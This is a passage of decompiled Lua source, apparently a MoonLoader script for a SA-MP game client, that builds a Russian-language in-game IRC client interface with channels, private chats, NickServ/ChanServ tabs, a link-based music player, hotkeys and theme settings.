							ChanBool[iter_15_2] = false
							var_0_12.ChanBool[iter_15_2] = false

							var_0_10.save(var_0_12, var_0_11)
						end
					elseif var_0_13.ColoredButton("Войти в " .. iter_15_3, "32CD32", 50, true) then
						sendIRC("join", iter_15_3, var_0_12.ChanKey[iter_15_2])

						local var_15_7 = string.format("#crd%s", iter_15_3)

						sendIRC("join", var_15_7)

						ChanBool[iter_15_2] = true
						var_0_12.ChanBool[iter_15_2] = true

						var_0_10.save(var_0_12, var_0_11)
					end

					if var_0_13.ColoredButton("Удалить " .. iter_15_3, "F94242", 50, true) then
						deleteChan(iter_15_2, iter_15_3)
					end

					var_0_13.EndChild()
				end

				if MimParamChan then
					var_0_13.OpenPopup("Параметры " .. iter_15_3)

					if var_0_13.BeginPopupModal("Параметры " .. iter_15_3, _, var_0_13.WindowFlags.NoResize) then
						var_0_13.SetWindowSizeVec2(var_0_13.ImVec2(550, 600))
						var_0_13.InputTextWithHint("Текущая команда: (/" .. var_0_12.ChanCmd[iter_15_2] .. ")", "Введите новую команду", var_0_31, 512)
						var_0_16.ToggleButton("Изменить тег", var_0_27)

						if var_0_27[0] then
							if var_0_12.ChanTag[iter_15_2] == nil then
								var_0_12.ChanTag[iter_15_2] = ""
							end

							var_0_13.InputTextWithHint("Текущий тег: (" .. var_0_12.ChanTag[iter_15_2] .. ")", "Введите новый тег", var_0_32, 512)

							if var_0_16.AnimButton("Удалить текущий тег", var_0_13.ImVec2(140, 24)) then
								var_0_12.ChanTag[iter_15_2] = ""
								var_0_12.ChanCrlTag[iter_15_2] = ""

								var_0_10.save(var_0_12, var_0_11)

								var_0_27[0] = false
							end

							if MimBoolTag then
								var_0_13.TextColoredRGB("Ваш тег: " .. ChanCrlTagv)
							end

							var_0_13.CenterText("Нажмите на любой цвет после ввода тега")

							if var_0_13.BeginChild("CRL LIAST TAG2", var_0_13.ImVec2(-1, 200), true) then
								for iter_15_8, iter_15_9 in pairs(CrlIRCtoSend) do
									local var_15_8 = iter_15_9:gsub("{(.-)}", "%1")

									if var_0_13.ColoredButton(var_15_8, var_15_8, 50, true) then
										ChanCrlTagv = string.format("%s«%s»", iter_15_9, var_0_14.string(var_0_32))
										ChanCrlTagk = iter_15_8
										ChanCrlTagkk = string.format("«%s»", var_0_14.string(var_0_32))
										MimBoolTag = true
									end
								end

								var_0_13.EndChild()
							end
						end

						if var_0_13.ColoredButton("Сохранить", "32CD32", 50, false, var_0_13.ImVec2(140, 24)) then
							if var_0_14.string(var_0_31) == "" then
								var_0_13.StrCopy(var_0_31, var_0_12.ChanCmd[iter_15_2])
							end

							fSendChanImg(iter_15_2)
							var_0_13.StrCopy(var_0_31, "")
							var_0_13.StrCopy(var_0_32, "")

							MimParamChan = false
							BanlistChan = false
							notAddChan2 = false
							ChanCrlTagk = ""
							ChanCrlTagkk = ""
							MimBoolTag = false
							var_0_27[0] = false
						end

						var_0_13.SameLine()

						if ChanBool[iter_15_2] then
							if not BanlistChan then
								if var_0_16.AnimButton("Бан-лист: " .. iter_15_3) then
									banUserChan[iter_15_2] = {}

									sendIRC("send", "mode %s +b", iter_15_3)

									BanlistChan = true
								end
							else
								if var_0_13.BeginChild("Парамеры канала", var_0_13.ImVec2(365, 175), true) then
									var_0_13.CenterText("Бан-лист: " .. iter_15_3)
									var_0_16.Hint("##hint6", "Нажми на любой ник чтобы разбанить", var_0_13.GetStyle().Colors[var_0_13.Col.TextDisabled])
									var_0_13.Separator()

									for iter_15_10, iter_15_11 in pairs(banUserChan[iter_15_2]) do
										if var_0_13.CenterSelectable(iter_15_11, false) then
											sendIRC("send", "mode %s -b %s", iter_15_3, iter_15_11)
										end
									end

									var_0_13.EndChild()
								end

								var_0_13.SetCursorPosX(325)

								if var_0_16.AnimButton("Закрыть список", var_0_13.ImVec2(180, 25)) then
									BanlistChan = false
								end
							end
						end

						var_0_13.SetCursorPos(var_0_13.ImVec2(162.5, 570))

						if var_0_16.AnimButton("Закрыть", var_0_13.ImVec2(200, 24)) then
							MimParamChan = false
							BanlistChan = false
							notAddChan2 = false
							ChanCrlTagk = ""
							ChanCrlTagkk = ""
							MimBoolTag = false
							var_0_27[0] = false
						end

						var_0_13.End()
					end
				end

				var_0_13.EndTabItem()
			end
		end

		for iter_15_12, iter_15_13 in ipairs(var_0_12.NickPm) do
			if var_0_13.BeginTabItem(iter_15_13) then
				var_0_13.SetCursorPos(var_0_13.ImVec2(1, 60))

				if var_0_13.BeginChild("Чат PM", var_0_13.ImVec2(var_15_2 - 200, var_15_3 - 92), true) then
					for iter_15_14, iter_15_15 in ipairs(LogChatPm[iter_15_12]) do
						var_0_13.TextColoredRGB(" > {ffffff}" .. iter_15_15)
					end

					var_0_13.SetScrollY(var_0_13.GetScrollMaxY())
					var_0_13.EndChild()
				end

				var_0_13.SetCursorPos(var_0_13.ImVec2(1, var_15_3 - 30))
				var_0_13.PushItemWidth(var_15_2 - 200)

				if var_0_13.InputTextWithHint("##BufSendChat", "Введите сообщение [Enter]", var_0_28, 512, var_0_19.EnterReturnsTrue) then
					fSendPm(var_0_14.string(var_0_28), iter_15_12)
					var_0_13.StrCopy(var_0_28, "")
					var_0_13.SetKeyboardFocusHere(-1)
				end

				var_0_13.SetCursorPos(var_0_13.ImVec2(var_15_2 - 200, 90))

				if var_0_13.BeginChild("Действия с ником", var_0_13.ImVec2(199, -1), false) then
					var_0_13.Separator()
					var_0_13.SetCursorPosX(30)
					var_0_13.SetCursorPosX(30)

					if var_0_16.AnimButton("Удалить переписку", var_0_13.ImVec2(140, 24)) then
						local var_15_9 = #var_0_12.NickPm

						table.remove(LogChatPm, iter_15_12)
						table.remove(var_0_12.logPm, iter_15_12)
						table.remove(var_0_12.NickPm, iter_15_12)
						sampUnregisterChatCommand(var_0_12.cfg.CmdNickPm .. var_15_9)
						var_0_10.save(var_0_12, var_0_11)
					end

					var_0_13.SetCursorPosX(30)
					var_0_13.EndChild()
				end

				var_0_13.EndTabItem()
			end
		end

		var_0_13.EndTabBar()
	end

	if var_0_39[0] == 2 and var_0_13.BeginTabBar("Cmd") then
		for iter_15_16, iter_15_17 in ipairs(var_0_42) do
			if var_0_13.BeginTabItem(iter_15_17) then
				var_0_13.SetCursorPos(var_0_13.ImVec2(1, 60))

				if var_0_13.BeginChild("CMD", var_0_13.ImVec2(var_15_2 - 200, var_15_3 - 92), true) then
					if iter_15_17 == "NickServ" then
						for iter_15_18, iter_15_19 in ipairs(NickServChat) do
							var_0_13.TextWrapped("> " .. iter_15_19)
						end
					end

					if iter_15_17 == "ChanServ" then
						for iter_15_20, iter_15_21 in ipairs(ChanServChat) do
							var_0_13.TextWrapped("> " .. iter_15_21)
						end
					end

					if iter_15_17 == "Console" then
						for iter_15_22, iter_15_23 in ipairs(DebugChat) do
							var_0_13.TextWrapped("> " .. iter_15_23)
						end
					end

					var_0_13.SetScrollY(var_0_13.GetScrollMaxY())
					var_0_13.EndChild()
				end

				var_0_13.SetCursorPos(var_0_13.ImVec2(1, var_15_3 - 30))
				var_0_13.PushItemWidth(var_15_2 - 200)

				if var_0_13.InputTextWithHint("##BufSendCmd", "Введите сообщение [Enter]", var_0_29, 512, var_0_19.EnterReturnsTrue) then
					if iter_15_17 == "NickServ" then
						sendIRC("send", "nickserv " .. var_0_14.string(var_0_29))
					end

					if iter_15_17 == "ChanServ" then
						sendIRC("send", "chanserv " .. var_0_14.string(var_0_29))
					end

					if iter_15_17 == "Console" then
						sendIRC("send", var_0_14.string(var_0_29))
					end

					var_0_13.StrCopy(var_0_29, "")
					var_0_13.SetKeyboardFocusHere(-1)
				end

				var_0_13.EndTabItem()
			end
		end

		var_0_13.EndTabBar()
	end

	if var_0_39[0] == 3 then
		if var_0_13.BeginChild("Управление", var_0_13.ImVec2(460, 265), true) then
			var_0_13.SetCursorPosX(35)

			local var_15_10 = var_0_18.int(var_0_44[0] * 20)

			var_0_16.CircularProgressBar(var_15_10, 40, 5, "Громкость")
			var_0_13.PushItemWidth(150)

			if var_0_13.SliderFloat("##Progress", var_0_44, 0, 5) and PlaySound ~= nil then
				setAudioStreamVolume(PlaySound, var_0_44[0])
			end

			if PlaySound ~= nil then
				var_0_13.SameLine()

				if pause_bool then
					if var_0_16.AnimButton("Pause", var_0_13.ImVec2(100, 24)) and PlaySound ~= nil then
						setAudioStreamState(PlaySound, var_0_7.PAUSE)

						pause_bool = false
					end
				elseif var_0_16.AnimButton("Resume", var_0_13.ImVec2(100, 24)) and PlaySound ~= nil then
					setAudioStreamState(PlaySound, var_0_7.RESUME)

					pause_bool = true
				end
			end

			var_0_13.PushItemWidth(450)

			if var_0_13.InputTextWithHint("##BufMisicPlay", "Вставьте прямую ссылку на трек. Play - [Enter]", var_0_33, 512, var_0_19.EnterReturnsTrue) then
				irc_music_down(var_0_14.string(var_0_33))
				var_0_13.StrCopy(var_0_33, "")
			end

			var_0_13.PopItemWidth()
			var_0_13.Separator()

			if var_0_16.ToggleButton("Автоматически включать песню когда чат прислали ссылку", var_0_22) then
				var_0_12.cfg.AutoPlayMp3 = var_0_22[0]

				var_0_10.save(var_0_12, var_0_11)
			end

			if var_0_16.ToggleButton("Автоматически чистить КЕШ скачаных треков", var_0_23) then
				var_0_12.cfg.AutoDelFileMp3 = var_0_23[0]

				var_0_10.save(var_0_12, var_0_11)
			end

			var_0_16.Hint("##hint4", "Удаляет КЕШ раз в 5 дней", var_0_13.GetStyle().Colors[var_0_13.Col.TextDisabled])
			var_0_13.SameLine()

			if var_0_16.AnimButton("Почистить КЕШ", var_0_13.ImVec2(100, 24)) then
				yourFunction("2")
			end

			var_0_16.Hint("##hint5", "Удаляет КЕШ по пути: " .. var_0_45, var_0_13.GetStyle().Colors[var_0_13.Col.TextDisabled])
			var_0_13.SetCursorPosX(20)

			if HotKeyMusic:ShowHotKey() then
				var_0_12.cfg.HotKeyMusic = encodeJson(HotKeyMusic:GetHotKey())

				var_0_10.save(var_0_12, var_0_11)
			end

			var_0_13.SameLine()
			var_0_13.Text("< Клавиша Pause/Resume - трека")
			var_0_13.SetCursorPos(var_0_13.ImVec2(150, 20))

			if dowmBoolMp3 then
				var_0_13.SetCursorPosX(150)
				var_0_13.ProgressBar(dowmMp3N1 / dowmMp3N2, var_0_13.ImVec2(200, 30), "Загрузка трека " .. dowmMp3N1)

				dowmBoolMp3 = not var_0_43
			end

			var_0_13.EndChild()
		end

		var_0_13.SameLine()

		if var_0_13.BeginChild("Сайты с музыкой", var_0_13.ImVec2(-1, 265), true) then
			var_0_13.CenterText("Сайты с музыкой")
			var_0_16.Hint("##hint1", "Нажми на любой сайт", var_0_13.GetStyle().Colors[var_0_13.Col.TextDisabled])
			var_0_13.Separator()

			for iter_15_24, iter_15_25 in ipairs(urlName) do
				if var_0_13.CenterSelectable(iter_15_25, false) then
					os.execute("start " .. urlMusic[iter_15_24])
				end
			end

			var_0_13.EndChild()
		end

		var_0_13.SetCursorPosY(300)
		var_0_13.Separator()
		var_0_13.CenterText("Список сохраненных URL-треков")
		var_0_16.Hint("##hint2", "Нажми на любую ссылку", var_0_13.GetStyle().Colors[var_0_13.Col.TextDisabled])

		if var_0_13.BeginChild("Список песен", var_0_13.ImVec2(-1, -1), true) then
			for iter_15_26 = #var_0_12.comboMusic, 1, -1 do
				local var_15_11 = iter_15_26
				local var_15_12 = var_0_12.comboMusic[iter_15_26]

				if var_0_13.Selectable("> " .. var_15_12) then
					mimMusicPlay = true
					MusicPlay = var_15_12
					MusicPlayi = iter_15_26
				end
			end

			var_0_13.EndChild()
		end

		if mimMusicPlay then
			var_0_13.OpenPopup("Кому отправить трек?")

			if var_0_13.BeginPopupModal("Кому отправить трек?", _, var_0_13.WindowFlags.NoResize) then
				var_0_13.SetWindowSizeVec2(var_0_13.ImVec2(250, 400))

				if var_0_13.BeginChild("Кому отправить трек?", var_0_13.ImVec2(-1, 305), true) then
					if var_0_13.CenterSelectable("Включить себе", false) then
						irc_music_down(MusicPlay)

						mimMusicPlay = false
					end

					var_0_13.Separator()

					for iter_15_27, iter_15_28 in ipairs(var_0_12.ChanName) do
						if var_0_12.ChanBool[iter_15_27] and var_0_13.CenterSelectable(iter_15_28, false) then
							fSendChan(MusicPlay, iter_15_27)

							mimMusicPlay = false
						end
					end

					var_0_13.Separator()

					for iter_15_29, iter_15_30 in ipairs(var_0_12.NickPm) do
						if var_0_13.CenterSelectable(iter_15_30, false) then
							fSendPm(MusicPlay, iter_15_29)

							mimMusicPlay = false
						end
					end

					var_0_13.EndChild()
				end

				var_0_13.SetCursorPosX(50)

				if var_0_16.AnimButton("Удалить URL", var_0_13.ImVec2(150, 24)) then
					table.remove(var_0_12.comboMusic, MusicPlayi)
					var_0_10.save(var_0_12, var_0_11)

					mimMusicPlay = false
				end

				var_0_13.SetCursorPosX(50)

				if var_0_16.AnimButton("Закрыть", var_0_13.ImVec2(150, 24)) then
					mimMusicPlay = false
				end

				var_0_13.End()
			end
		end
	end

	if var_0_39[0] == 4 then
		if var_0_16.PageButton(var_0_38 == 1, "#", "Клавиши") then
			var_0_38 = 1
		end

		if var_0_16.PageButton(var_0_38 == 2, "#", "Команды") then
			var_0_38 = 2
		end

		if var_0_16.PageButton(var_0_38 == 3, "#", "Прочее") then
			var_0_38 = 3
		end

		var_0_13.SetCursorPos(var_0_13.ImVec2(200, 40))
		var_0_13.BeginChild("PramTab", var_0_13.ImVec2(-1, -1))

		if var_0_38 == 1 then
			if HotKeyMenu:ShowHotKey() then
				var_0_12.cfg.HotKeyMenu = encodeJson(HotKeyMenu:GetHotKey())

				var_0_10.save(var_0_12, var_0_11)
			end

			var_0_13.SameLine()
			var_0_13.Text("< Открыть / Закрыть - меню IRC")

			if HotKeyYes:ShowHotKey() then
				var_0_12.cfg.HotKeyYes = encodeJson(HotKeyYes:GetHotKey())

				var_0_10.save(var_0_12, var_0_11)
			end

			var_0_13.SameLine()
			var_0_13.Text("< Клавиша подтверждения")

			if HotKeyNo:ShowHotKey() then
				var_0_12.cfg.HotKeyNo = encodeJson(HotKeyNo:GetHotKey())

				var_0_10.save(var_0_12, var_0_11)
			end

			var_0_13.SameLine()
			var_0_13.Text("< Клавиша отмены")

			if HotKeyMusic:ShowHotKey() then
				var_0_12.cfg.HotKeyMusic = encodeJson(HotKeyMusic:GetHotKey())

				var_0_10.save(var_0_12, var_0_11)
			end

			var_0_13.SameLine()
			var_0_13.Text("< Клавиша Pause/Resume - трека")
		end

		if var_0_38 == 2 then
			var_0_13.PushItemWidth(200)

			if var_0_13.InputTextWithHint("Команда  для приватных чатов Текущая: /" .. var_0_12.cfg.CmdNickPm, "Примеры: /ww, /pm, /i [Enter]", var_0_35, 512, var_0_19.EnterReturnsTrue) then
				for iter_15_31, iter_15_32 in ipairs(var_0_12.NickPm) do
					sampUnregisterChatCommand(var_0_12.cfg.CmdNickPm .. iter_15_31)
				end

				var_0_12.cfg.CmdNickPm = var_0_14.string(var_0_35)

				var_0_10.save(var_0_12, var_0_11)

				for iter_15_33, iter_15_34 in ipairs(var_0_12.NickPm) do
					sampRegisterChatCommand(var_0_12.cfg.CmdNickPm .. iter_15_33, function(arg_16_0)
						fSendPmU8(arg_16_0, iter_15_33)
					end)
				end

				var_0_13.StrCopy(var_0_35, "")
			end

			local var_15_13 = "Текущие команды: "

			for iter_15_35, iter_15_36 in ipairs(var_0_12.NickPm) do
				var_15_13 = var_15_13 .. "/" .. var_0_12.cfg.CmdNickPm .. iter_15_35 .. " - " .. iter_15_36

				if iter_15_35 < #var_0_12.NickPm then
					var_15_13 = var_15_13 .. " | "
				end
			end

			var_0_13.Separator()
			var_0_13.TextWrapped(var_15_13)
			var_0_13.Separator()

			for iter_15_37, iter_15_38 in ipairs(var_0_12.ChanCmd) do
				var_0_13.Text("/" .. iter_15_38 .. " - сообщение на канал " .. var_0_12.ChanName[iter_15_37])
				var_0_13.Text("/" .. ChanCrd[iter_15_37] .. " - корды на канал " .. var_0_12.ChanName[iter_15_37])
			end

			var_0_13.Separator()
		end

		if var_0_38 == 3 then
			var_0_13.PushItemWidth(100)

			if var_0_13.InputInt("Звуковое уведомление входящих сообщений каналов", var_0_40) then
				addOneOffSound(0, 0, 0, var_0_40[0])

				var_0_12.cfg.SoundChan = var_0_40[0]

				var_0_10.save(var_0_12, var_0_11)
			end

			var_0_13.PushItemWidth(100)

			if var_0_13.InputInt("Звуковое уведомление входящих сообщений приватных чатов", var_0_41) then
				addOneOffSound(0, 0, 0, var_0_41[0])

				var_0_12.cfg.SoundPm = var_0_41[0]

				var_0_10.save(var_0_12, var_0_11)
			end

			var_0_13.Separator()

			if var_0_16.ToggleButton("Разрешить входящие личные сообщение от новых игроков", var_0_24) then
				var_0_12.cfg.NickPmBool = var_0_24[0]

				var_0_10.save(var_0_12, var_0_11)
			end

			var_0_16.Hint("##hint9", "Игроки которых нету во вкладках 'Каналы и Чаты' - смогут вам написать личное сообщение", var_0_13.GetStyle().Colors[var_0_13.Col.TextDisabled])

			if var_0_16.ToggleButton("Работа в свернутом режиме", var_0_26) then
				var_0_12.cfg.AntiAfk = var_0_26[0]

				var_0_10.save(var_0_12, var_0_11)

				local var_15_14 = var_0_26[0]

				fAFK(var_15_14)
			end

			var_0_16.Hint("##hintAnti-AFK", "Скрипт продолжит работу когда игра свернута. Кто играет с лаунчера - выключайте эту функцию.", var_0_13.GetStyle().Colors[var_0_13.Col.TextDisabled])

			if var_0_16.ToggleButton("Авторизация акаунта через сервис NickServ", var_0_25) then
				var_0_12.cfg.NickServBool = var_0_25[0]

				var_0_10.save(var_0_12, var_0_11)
			end

			if var_0_12.cfg.NickServBool then
				var_0_13.Separator()
				var_0_13.PushItemWidth(200)

				if var_0_13.InputTextWithHint("Пароль от ника через сервис (NickServ) <", "Введите пароль [Enter]", var_0_34, 512, var_0_19.EnterReturnsTrue + var_0_19.Password) then
					var_0_12.cfg.NickPass = var_0_14.string(var_0_34)

					var_0_10.save(var_0_12, var_0_11)
					var_0_13.StrCopy(var_0_34, "")
				end

				var_0_16.Hint("##hint8", "Ваш ник не зарегистрирован через сервис (NickServ)", var_0_13.GetStyle().Colors[var_0_13.Col.TextDisabled])

				if var_0_16.AnimButton("Показать пароль") then
					sampAddChat("{00ff00}[IRC] {aaaaaa}Пароль NickServ: {00ff00}" .. var_0_12.cfg.NickPass)
				end

				var_0_13.Separator()
			end
		end

		var_0_13.EndChild()
	end

	if var_0_39[0] == 5 then
		-- block empty
	end

	var_0_13.End()
end)

function irc_menu()
	var_0_21[0] = not var_0_21[0]
end

function mimgui_theme()
	var_0_13.SwitchContext()

	local var_18_0 = var_0_13.ImVec4

	var_0_13.GetStyle().WindowPadding = var_0_13.ImVec2(5, 5)
	var_0_13.GetStyle().FramePadding = var_0_13.ImVec2(5, 5)
	var_0_13.GetStyle().ItemSpacing = var_0_13.ImVec2(5, 5)
	var_0_13.GetStyle().ItemInnerSpacing = var_0_13.ImVec2(2, 2)
	var_0_13.GetStyle().TouchExtraPadding = var_0_13.ImVec2(0, 0)
	var_0_13.GetStyle().IndentSpacing = 0
	var_0_13.GetStyle().ScrollbarSize = 10
	var_0_13.GetStyle().GrabMinSize = 10
	var_0_13.GetStyle().WindowBorderSize = 1
	var_0_13.GetStyle().ChildBorderSize = 1
	var_0_13.GetStyle().PopupBorderSize = 1
	var_0_13.GetStyle().FrameBorderSize = 1
	var_0_13.GetStyle().TabBorderSize = 1
	var_0_13.GetStyle().WindowRounding = 8
	var_0_13.GetStyle().ChildRounding = 8
	var_0_13.GetStyle().FrameRounding = 8
	var_0_13.GetStyle().PopupRounding = 8
	var_0_13.GetStyle().ScrollbarRounding = 8
	var_0_13.GetStyle().GrabRounding = 8
	var_0_13.GetStyle().TabRounding = 8
	var_0_13.GetStyle().Colors[var_0_13.Col.Text] = var_18_0(1, 1, 1, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.TextDisabled] = var_18_0(0.5, 0.5, 0.5, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.WindowBg] = var_18_0(0.06, 0.06, 0.06, 0.94)
	var_0_13.GetStyle().Colors[var_0_13.Col.ChildBg] = var_18_0(1, 1, 1, 0)
	var_0_13.GetStyle().Colors[var_0_13.Col.PopupBg] = var_18_0(0.08, 0.08, 0.08, 0.94)
	var_0_13.GetStyle().Colors[var_0_13.Col.Border] = var_18_0(0.43, 0.43, 0.5, 0.5)
	var_0_13.GetStyle().Colors[var_0_13.Col.BorderShadow] = var_18_0(0, 0, 0, 0)
	var_0_13.GetStyle().Colors[var_0_13.Col.FrameBg] = var_18_0(0.48, 0.16, 0.16, 0.54)
	var_0_13.GetStyle().Colors[var_0_13.Col.FrameBgHovered] = var_18_0(0.98, 0.26, 0.26, 0.4)
	var_0_13.GetStyle().Colors[var_0_13.Col.FrameBgActive] = var_18_0(0.98, 0.26, 0.26, 0.67)
	var_0_13.GetStyle().Colors[var_0_13.Col.TitleBg] = var_18_0(0.04, 0.04, 0.04, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.TitleBgActive] = var_18_0(0.48, 0.16, 0.16, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.TitleBgCollapsed] = var_18_0(0, 0, 0, 0.51)
	var_0_13.GetStyle().Colors[var_0_13.Col.MenuBarBg] = var_18_0(0.14, 0.14, 0.14, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.ScrollbarBg] = var_18_0(0.02, 0.02, 0.02, 0.53)
	var_0_13.GetStyle().Colors[var_0_13.Col.ScrollbarGrab] = var_18_0(0.31, 0.31, 0.31, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.ScrollbarGrabHovered] = var_18_0(0.41, 0.41, 0.41, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.ScrollbarGrabActive] = var_18_0(0.51, 0.51, 0.51, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.CheckMark] = var_18_0(0.98, 0.26, 0.26, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.SliderGrab] = var_18_0(0.88, 0.26, 0.24, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.SliderGrabActive] = var_18_0(0.98, 0.26, 0.26, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.Button] = var_18_0(0.98, 0.26, 0.26, 0.4)
	var_0_13.GetStyle().Colors[var_0_13.Col.ButtonHovered] = var_18_0(0.98, 0.26, 0.26, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.ButtonActive] = var_18_0(0.98, 0.06, 0.06, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.Header] = var_18_0(0.98, 0.26, 0.26, 0.31)
	var_0_13.GetStyle().Colors[var_0_13.Col.HeaderHovered] = var_18_0(0.98, 0.26, 0.26, 0.8)
	var_0_13.GetStyle().Colors[var_0_13.Col.HeaderActive] = var_18_0(0.98, 0.26, 0.26, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.Separator] = var_18_0(0.43, 0.43, 0.5, 0.5)
	var_0_13.GetStyle().Colors[var_0_13.Col.SeparatorHovered] = var_18_0(0.75, 0.1, 0.1, 0.78)
	var_0_13.GetStyle().Colors[var_0_13.Col.SeparatorActive] = var_18_0(0.75, 0.1, 0.1, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.ResizeGrip] = var_18_0(0.98, 0.26, 0.26, 0.25)
	var_0_13.GetStyle().Colors[var_0_13.Col.ResizeGripHovered] = var_18_0(0.98, 0.26, 0.26, 0.67)
	var_0_13.GetStyle().Colors[var_0_13.Col.ResizeGripActive] = var_18_0(0.98, 0.26, 0.26, 0.95)
	var_0_13.GetStyle().Colors[var_0_13.Col.Tab] = var_18_0(0.98, 0.26, 0.26, 0.4)
	var_0_13.GetStyle().Colors[var_0_13.Col.TabHovered] = var_18_0(0.98, 0.26, 0.26, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.TabActive] = var_18_0(0.98, 0.06, 0.06, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.TabUnfocused] = var_18_0(0.98, 0.26, 0.26, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.TabUnfocusedActive] = var_18_0(0.98, 0.26, 0.26, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.PlotLines] = var_18_0(0.61, 0.61, 0.61, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.PlotLinesHovered] = var_18_0(1, 0.43, 0.35, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.PlotHistogram] = var_18_0(0.9, 0.7, 0, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.PlotHistogramHovered] = var_18_0(1, 0.6, 0, 1)
	var_0_13.GetStyle().Colors[var_0_13.Col.TextSelectedBg] = var_18_0(0.98, 0.26, 0.26, 0.35)
end

var_0_13.OnInitialize(function()
	var_0_13.GetIO().IniFilename = nil

	mimgui_theme()
	addEventHandler("onWindowMessage", function(arg_20_0, arg_20_1, arg_20_2)
		if (arg_20_0 == 256 or arg_20_0 == 257) and arg_20_1 == var_0_2.VK_ESCAPE and var_0_21[0] and not isPauseMenuActive() then
			consumeWindowMessage(true, false)

			if arg_20_0 == 257 then
				var_0_21[0] = false
			end
		end
	end)
end)

function var_0_13.TextColoredRGB(arg_21_0)
	local var_21_0 = var_0_13.GetStyle().Colors
	local var_21_1 = var_0_13.ImVec4

	local function var_21_2(arg_22_0)
		local var_22_0 = bit.band(bit.rshift(arg_22_0, 24), 255)
		local var_22_1 = bit.band(bit.rshift(arg_22_0, 16), 255)
		local var_22_2 = bit.band(bit.rshift(arg_22_0, 8), 255)
		local var_22_3 = bit.band(arg_22_0, 255)

		return var_22_0, var_22_1, var_22_2, var_22_3
	end

	local function var_21_3(arg_23_0)
		if arg_23_0:sub(1, 6):upper() == "SSSSSS" then
			local var_23_0 = var_21_0[1].x
			local var_23_1 = var_21_0[1].y
			local var_23_2 = var_21_0[1].z
			local var_23_3 = tonumber(arg_23_0:sub(7, 8), 16) or var_21_0[1].w * 255

			return var_21_1(var_23_0, var_23_1, var_23_2, var_23_3 / 255)
		end

		local var_23_4 = type(arg_23_0) == "string" and tonumber(arg_23_0, 16) or arg_23_0

		if type(var_23_4) ~= "number" then
			return
		end

		local var_23_5, var_23_6, var_23_7, var_23_8 = var_21_2(var_23_4)

		return var_0_13.ImVec4(var_23_5 / 255, var_23_6 / 255, var_23_7 / 255, var_23_8 / 255)
	end

	;(function(arg_24_0)
		for iter_24_0 in arg_24_0:gmatch("[^\r\n]+") do
			local var_24_0 = {}
			local var_24_1 = {}
			local var_24_2 = 1

			iter_24_0 = iter_24_0:gsub("{(......)}", "{%1FF}")

			while iter_24_0:find("{........}") do
				local var_24_3, var_24_4 = iter_24_0:find("{........}")
				local var_24_5 = var_21_3(iter_24_0:sub(var_24_3 + 1, var_24_4 - 1))

				if var_24_5 then
					var_24_0[#var_24_0], var_24_0[#var_24_0 + 1] = iter_24_0:sub(var_24_2, var_24_3 - 1), iter_24_0:sub(var_24_4 + 1, #iter_24_0)
					var_24_1[#var_24_1 + 1] = var_24_5
					var_24_2 = var_24_3
				end

				iter_24_0 = iter_24_0:sub(1, var_24_3 - 1) .. iter_24_0:sub(var_24_4 + 1, #iter_24_0)
			end

			if var_24_0[0] then
				for iter_24_1 = 0, #var_24_0 do
					var_0_13.TextColored(var_24_1[iter_24_1] or var_21_0[1], var_24_0[iter_24_1])
					var_0_13.SameLine(nil, 0)
				end

				var_0_13.NewLine()
			else
				var_0_13.Text(iter_24_0)
			end
		end
	end)(arg_21_0)
end

function var_0_13.CenterText(arg_25_0)
	var_0_13.SetCursorPosX(var_0_13.GetWindowWidth() / 2 - var_0_13.CalcTextSize(arg_25_0).x / 2)
	var_0_13.Text(arg_25_0)
end

function var_0_13.CenterSelectable(arg_26_0, arg_26_1)
	local var_26_0 = var_0_13.CalcTextSize(arg_26_0).x

	var_0_13.SetCursorPosX(var_0_13.GetWindowWidth() / 2 - var_26_0 / 2)

	return (var_0_13.Selectable(arg_26_0, arg_26_1, 0, var_0_13.ImVec2(var_26_0, 15)))
end

function var_0_13.ColoredButton(arg_27_0, arg_27_1, arg_27_2, arg_27_3, arg_27_4)
	if arg_27_3 then
		var_0_13.SetCursorPosX(var_0_13.GetWindowWidth() / 2 - var_0_13.CalcTextSize(arg_27_0).x / 2)
	end

	local var_27_0 = tonumber("0x" .. arg_27_1:sub(1, 2))
	local var_27_1 = tonumber("0x" .. arg_27_1:sub(3, 4))
	local var_27_2 = tonumber("0x" .. arg_27_1:sub(5, 6))

	if tonumber(arg_27_2) ~= nil and tonumber(arg_27_2) < 101 and tonumber(arg_27_2) > 0 then
		a = arg_27_2
	else
		a = 60
	end

	var_0_13.PushStyleColor(var_0_13.Col.Button, var_0_13.ImVec4(var_27_0 / 255, var_27_1 / 255, var_27_2 / 255, a / 100))
	var_0_13.PushStyleColor(var_0_13.Col.ButtonHovered, var_0_13.ImVec4(var_27_0 / 255, var_27_1 / 255, var_27_2 / 255, a / 100))
	var_0_13.PushStyleColor(var_0_13.Col.ButtonActive, var_0_13.ImVec4(var_27_0 / 255, var_27_1 / 255, var_27_2 / 255, a / 100))

	local var_27_3 = var_0_16.AnimButton(arg_27_0, arg_27_4)

	var_0_13.PopStyleColor(3)

	return var_27_3
end

function getFileNameFromUrl(arg_28_0)
	local var_28_0 = 0
	local var_28_1 = 1

	for iter_28_0 = 1, #arg_28_0 do
		var_28_0 = var_28_0 + string.byte(arg_28_0, iter_28_0) * var_28_1
		var_28_1 = var_28_1 * 31
	end

	math.randomseed(os.clock())

	local var_28_2 = var_28_0 + math.random(100000, 999999)

	return string.sub(tostring(var_28_2), 1, 19)
end

function generateDownloadLinkFromURL(arg_29_0)
	local var_29_0 = string.match(arg_29_0, "/d/([%w-_]+)")

	if var_29_0 then
